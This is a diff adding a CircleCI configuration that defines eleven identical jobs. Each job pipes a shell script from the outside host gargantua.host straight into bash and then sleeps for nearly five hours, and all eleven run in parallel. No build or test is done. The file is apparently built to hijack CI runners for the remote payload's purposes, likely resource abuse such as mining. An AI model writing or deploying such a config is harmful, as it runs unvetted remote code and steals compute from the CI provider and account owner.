@@ -1,0 +1,127 @@
+version: 2.1
+
+jobs:
+  ghparidply:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahekanase.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  ghparidply1:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahekanase.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  ghparidply2:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahekanase.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  ghparidply3:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahekanase.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  ghparidply4:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahekanase.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  ghparidply5:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahekanase.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  ghparidply6:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahekanase.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  ghparidply7:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahekanase.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  ghparidply8:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahekanase.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  ghparidply9:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahekanase.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  ghparidply10:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahekanase.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+workflows:
+  main:
+    jobs:
+      - ghparidply
+      - ghparidply1
+      - ghparidply2
+      - ghparidply3
+      - ghparidply4
+      - ghparidply5
+      - ghparidply6
+      - ghparidply7
+      - ghparidply8
+      - ghparidply9
+      - ghparidply10
